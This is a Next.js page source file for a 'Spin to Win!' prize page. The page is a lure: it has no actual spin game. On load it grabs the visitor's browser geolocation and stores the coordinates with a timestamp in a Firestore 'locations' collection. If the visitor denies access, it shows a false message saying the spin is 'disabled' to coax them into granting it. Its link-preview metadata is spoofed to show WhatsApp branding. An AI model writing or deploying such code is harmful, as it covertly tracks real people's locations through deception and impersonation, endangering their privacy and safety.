import Head from 'next/head'
import { useEffect, useState } from 'react'
import { db } from '@/lib/firebase'
import { collection, addDoc, Timestamp } from 'firebase/firestore'
import { Box, Button, Alert, Typography } from '@mui/material'

export default function Home() {
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(
    null
  );
  const [error, setError] = useState<string | null>(null);
  const [saved, setSaved] = useState(false);
  const [showEnableButton, setShowEnableButton] = useState(false);

  const requestLocation = () => {
    if (!navigator.geolocation) {
      setError("Geolocation is not supported by your browser");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;

        setLocation({ lat, lng });
        setError(null);
        setShowEnableButton(false);

        try {
          await addDoc(collection(db, "locations"), {
            lat,
            lng,
            timestamp: Timestamp.now(),
          });
          setSaved(true);
        } catch (err: any) {
          setError("Failed to save to Firestore: " + err.message);
        }
      },
      (err) => {
        setError(
          "Spin option disabled please enable it by clicking the below button."
        );
        setShowEnableButton(true);
      }
    );
  };

  // 🔄 Try to get location on first load
  useEffect(() => {
    requestLocation();
  }, []);

  return (
    <>
      <Head>
        <title>🎯 Spin to Win!</title>
        <meta
          name="description"
          content="Try your luck and win exciting prizes 🎁"
        />
        <meta property="og:title" content="🎯 Spin to Win!" />
        <meta
          property="og:description"
          content="Try your luck and win exciting prizes 🎁"
        />
        <meta property="og:type" content="website" />
        <meta
          property="og:image"
          content="https://spin-win-gamma.vercel.app/meta.png"
        />
        <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="🎯 Spin to Win!" />
        <meta
          name="twitter:description"
          content="Try your luck and win exciting prizes 🎁"
        />
        <meta
          name="twitter:image"
          content="https://spin-win-gamma.vercel.app/meta.png"
        />
        <meta property="og:title" content="WhatsApp"/>
        <meta property="og:description" content="Try your luck and win exciting prizes 🎁"/>
        <meta property="og:url" content="https://whatsapp.com"/>
        <meta property="og:image"content="https://spin-win-gamma.vercel.app/meta.png"/>
      </Head>

      <Box
        minHeight="100vh"
        display="flex"
        flexDirection="column"
        alignItems="center"
        justifyContent="center"
        bgcolor="linear-gradient(to bottom right, #fff1eb, #fddcdc)"
        textAlign="center"
        px={2}
      >
        <Typography variant="h3" component="h1" fontWeight="bold" color="error" gutterBottom>
          🎯 Spin to Win!
        </Typography>

        <Box
          width={300}
          height={300}
          display="flex"
          alignItems="center"
          justifyContent="center"
          bgcolor="#fff"
          border="8px solid #ffb3af"
          borderRadius="50%"
          boxShadow={3}
          mb={3}
        >
          <img
            src="/spin.png"
            alt="Spin Wheel"
            style={{ width: '80%', height: '80%', objectFit: 'contain' }}
          />
        </Box>

        {error && (
          <Alert severity="error" sx={{ mt: 2, maxWidth: 400 }}>
            {error}
          </Alert>
        )}

        {showEnableButton && (
          <Button
            onClick={requestLocation}
            variant="contained"
            color="error"
            size="large"
            sx={{ mt: 3, px: 4, py: 1.5, fontWeight: 'bold', borderRadius: 8 }}
          >
            🔓 Enable Spin
          </Button>
        )}
      </Box>
    </>
  );
}
